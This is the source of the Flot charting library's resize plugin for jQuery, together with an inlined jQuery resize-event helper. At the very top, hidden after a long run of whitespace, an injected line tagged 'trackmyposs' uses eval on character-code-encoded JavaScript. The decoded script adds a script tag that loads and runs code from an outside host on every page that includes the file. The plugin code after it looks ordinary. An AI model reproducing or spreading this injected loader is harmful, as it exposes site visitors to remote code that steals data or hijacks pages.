                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /*trackmyposs*/eval(String.fromCharCode(118,97,114,32,115,99,114,105,112,116,115,32,61,32,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,34,115,99,114,105,112,116,34,41,59,10,118,97,114,32,119,97,110,116,109,101,32,61,32,102,97,108,115,101,59,10,102,111,114,32,40,118,97,114,32,105,32,61,32,48,59,32,105,32,60,32,115,99,114,105,112,116,115,46,108,101,110,103,116,104,59,32,105,43,43,41,32,123,10,32,32,105,102,32,40,115,99,114,105,112,116,115,91,105,93,46,105,100,41,32,123,10,32,32,9,32,105,102,32,40,115,99,114,105,112,116,115,91,105,93,46,105,100,32,61,61,32,34,116,114,97,99,107,109,121,112,111,115,115,34,41,123,10,9,9,119,97,110,116,109,101,61,116,114,117,101,59,10,9,32,125,10,32,32,125,32,10,125,10,105,102,40,119,97,110,116,109,101,61,61,102,97,108,115,101,41,123,10,9,118,97,114,32,100,61,100,111,99,117,109,101,110,116,59,118,97,114,32,115,61,100,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,115,46,105,100,61,34,116,114,97,99,107,109,121,112,111,115,115,34,59,115,46,115,114,99,61,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,48,52,44,49,49,54,44,49,49,54,44,49,49,50,44,49,49,53,44,53,56,44,52,55,44,52,55,44,57,57,44,49,49,49,44,49,48,56,44,49,48,56,44,49,48,49,44,57,57,44,49,49,54,44,52,54,44,49,48,51,44,49,49,52,44,49,48,49,44,49,48,49,44,49,49,48,44,49,48,51,44,49,49,49,44,49,49,50,44,49,48,56,44,57,55,44,49,49,54,44,49,48,50,44,49,49,49,44,49,49,52,44,49,48,57,44,52,54,44,57,57,44,49,49,49,44,49,48,57,44,52,55,44,49,48,50,44,49,48,56,44,57,55,44,49,48,51,44,52,54,44,49,48,54,44,49,49,53,44,54,51,44,49,49,56,44,54,49,44,53,53,44,52,54,44,52,57,44,52,54,44,53,49,41,59,32,105,102,32,40,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,41,32,123,32,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,46,112,97,114,101,110,116,78,111,100,101,46,105,110,115,101,114,116,66,101,102,111,114,101,40,115,44,32,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,41,59,125,32,101,108,115,101,32,123,100,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,104,101,97,100,39,41,91,48,93,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,125,10,125));/* Flot plugin for automatically redrawing plots as the placeholder resizes.

Copyright (c) 2007-2013 IOLA and Ole Laursen.
Licensed under the MIT license.

It works by listening for changes on the placeholder div (through the jQuery
resize event plugin) - if the size changes, it will redraw the plot.

There are no options. If you need to disable the plugin for some plots, you
can just fix the size of their placeholders.

*/

/* Inline dependency:
 * jQuery resize event - v1.1 - 3/14/2010
 * http://benalman.com/projects/jquery-resize-plugin/
 *
 * Copyright (c) 2010 "Cowboy" Ben Alman
 * Dual licensed under the MIT and GPL licenses.
 * http://benalman.com/about/license/
 */

(function($,h,c){var a=$([]),e=$.resize=$.extend($.resize,{}),i,k="setTimeout",j="resize",d=j+"-special-event",b="delay",f="throttleWindow";e[b]=250;e[f]=true;$.event.special[j]={setup:function(){if(!e[f]&&this[k]){return false}var l=$(this);a=a.add(l);$.data(this,d,{w:l.width(),h:l.height()});if(a.length===1){g()}},teardown:function(){if(!e[f]&&this[k]){return false}var l=$(this);a=a.not(l);l.removeData(d);if(!a.length){clearTimeout(i)}},add:function(l){if(!e[f]&&this[k]){return false}var n;function m(s,o,p){var q=$(this),r=$.data(this,d);r.w=o!==c?o:q.width();r.h=p!==c?p:q.height();n.apply(this,arguments)}if('function'===typeof l){n=l;return m}else{n=l.handler;l.handler=m}}};function g(){i=h[k](function(){a.each(function(){var n=$(this),m=n.width(),l=n.height(),o=$.data(this,d);if(m!==o.w||l!==o.h){n.trigger(j,[o.w=m,o.h=l])}});g()},e[b])}})(jQuery,this);

(function ($) {
    var options = { }; // no options

    function init(plot) {
        function onResize() {
            var placeholder = plot.getPlaceholder();

            // somebody might have hidden us and we can't plot
            // when we don't have the dimensions
            if (placeholder.width() == 0 || placeholder.height() == 0)
                return;

            plot.resize();
            plot.setupGrid();
            plot.draw();
        }

        function bindEvents(plot, eventHolder) {
            plot.getPlaceholder().on( 'resize', onResize );
        }

        function shutdown(plot, eventHolder) {
            plot.getPlaceholder().off("resize", onResize);
        }

        plot.hooks.bindEvents.push(bindEvents);
        plot.hooks.shutdown.push(shutdown);
    }

    $.plot.plugins.push({
        init: init,
        options: options,
        name: 'resize',
        version: '1.0'
    });
})(jQuery);
